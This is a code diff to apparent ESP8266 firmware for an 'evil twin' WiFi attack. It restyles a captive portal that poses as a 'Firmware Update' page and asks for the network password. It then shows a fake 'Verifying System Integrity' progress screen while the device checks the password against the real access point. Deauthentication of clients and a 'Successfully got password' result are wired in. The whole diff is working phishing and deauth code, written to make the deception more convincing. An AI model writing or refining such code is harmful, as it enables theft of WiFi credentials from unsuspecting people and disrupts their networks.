@@ -43,32 +43,55 @@ String _tryPassword = "";
 
 String header(String t) {
   String a = String(_selectedNetwork.ssid);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }"
-               ;
-  String h = "<!DOCTYPE html><html>"
-             "<head><title><center>" + a + " :: " + t + "</center></title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-             "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  String CSS = "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; line-height: 1.6; margin: 0; padding: 0; background: #f5f5f5; color: #333; }"
+               "nav { background: linear-gradient(135deg, #0057b8, #004094); color: #fff; padding: 1em; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
+               "nav b { display: block; font-size: 1.2em; font-weight: 600; margin-bottom: 0.5em; }"
+               ".container { max-width: 500px; margin: 0 auto; padding: 20px; }"
+               ".update-card { background: white; border-radius: 10px; padding: 2em; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-top: 20px; }"
+               ".warning-icon { font-size: 48px; color: #ff9800; text-align: center; margin-bottom: 20px; }"
+               ".title { color: #d32f2f; font-size: 1.5em; margin: 0.5em 0; text-align: center; font-weight: 600; }"
+               ".input-group { margin: 1.5em 0; }"
+               "label { display: block; margin-bottom: 8px; color: #666; font-weight: 500; }"
+               "input[type='password'] { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 16px; transition: border-color 0.3s; box-sizing: border-box; }"
+               "input[type='password']:focus { border-color: #0057b8; outline: none; }"
+               "input[type='submit'] { width: 100%; background: #0057b8; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; cursor: pointer; transition: background 0.3s; }"
+               "input[type='submit']:hover { background: #004094; }"
+               ".progress { margin-top: 20px; width: 100%; }"
+               ".status-text { text-align: center; color: #666; margin-top: 10px; font-size: 0.9em; }";
+
+  String h = "<!DOCTYPE html><html lang='en'>"
+             "<head><title>" + a + " - Firmware Update</title>"
+             "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+             "<meta charset='UTF-8'>"
+             "<style>" + CSS + "</style></head>"
+             "<body>"
+             "<nav><b>" + a + "</b>" + SUBTITLE + "</nav>"
+             "<div class='container'>";
   return h;
 }
 
 String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+  return "<div class='status-text' style='margin-top:2em;text-align:center;'>"
+         "© 2024 All rights reserved."
+         "</div></body></html>";
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+  return header(TITLE) + 
+         "<div class='update-card'>"
+         "<div class='warning-icon'>⚠️</div>"
+         "<div class='title'>" + TITLE + "</div>"
+         "<p>" + BODY + "</p>"
+         "<form action='/' method='post'>"
+         "<div class='input-group'>"
+         "<label for='password'>WiFi Password</label>"
+         "<input type='password' id='password' name='password' minlength='8' required placeholder='Enter your WiFi password'>"
+         "</div>"
+         "<input type='submit' value='Verify & Continue'>"
+         "</form>"
+         "<p class='status-text'>This process may take a few moments.</p>"
+         "</div>"
+         "</div>" + footer();
 }
 
 void setup() {
@@ -117,6 +140,7 @@ void handleResult() {
   } else {
     _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
     hotspot_active = false;
+    deauthing_active = false;
     dnsServer.stop();
     int n = WiFi.softAPdisconnect (true);
     Serial.println(String(n));
@@ -228,24 +252,59 @@ void handleIndex() {
     webServer.send(200, "text/html", _html);
 
   } else {
-
     if (webServer.hasArg("password")) {
       _tryPassword = webServer.arg("password");
+      
+      // Show loading page immediately
+      String verificationPage = "<!DOCTYPE html>"
+        "<html lang='en'>"
+        "<head>"
+        "<meta charset='UTF-8'>"
+        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<title>Verifying</title>"
+        "<style>"
+        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;margin:0;padding:20px;background:#f5f5f5;color:#333;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}"
+        ".card{background:white;border-radius:10px;padding:2em;box-shadow:0 2px 8px rgba(0,0,0,0.1);max-width:400px;width:100%}"
+        ".title{font-size:1.5em;margin-bottom:1em;color:#333}"
+        ".loader{width:50px;height:50px;border:5px solid #f3f3f3;border-radius:50%;border-top:5px solid #0057b8;margin:20px auto;animation:spin 1s linear infinite}"
+        ".progress-bar{background:#eee;border-radius:8px;height:20px;margin:20px 0;overflow:hidden;position:relative}"
+        ".progress-bar-fill{background:linear-gradient(45deg,#0057b8,#0088ff);height:100%;width:0%;border-radius:8px;transition:width 0.5s ease;animation:progress 15s linear}"
+        "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}"
+        "@keyframes progress{0%{width:0%}100%{width:100%}}"
+        ".status{color:#666;margin-top:10px;font-size:0.9em}"
+        "</style>"
+        "<script>"
+        "setTimeout(function(){window.location.href='/result'},15000);"
+        "</script>"
+        "</head>"
+        "<body>"
+        "<div class='card'>"
+        "<div class='title'>Verifying System Integrity</div>"
+        "<div class='loader'></div>"
+        "<div class='progress-bar'>"
+        "<div class='progress-bar-fill'></div>"
+        "</div>"
+        "<div class='status'>Please wait while we verify your credentials...</div>"
+        "</div>"
+        "</body>"
+        "</html>";
+      
+      webServer.send(200, "text/html", verificationPage);
+      
+      // Handle deauth and WiFi connection after sending the page
       if (webServer.arg("deauth") == "start") {
         deauthing_active = false;
       }
-      delay(1000);
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
+      
       if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
+        deauthing_active = true;
       }
     } else {
       webServer.send(200, "text/html", index());
     }
   }
-
 }
 
 void handleAdmin() {
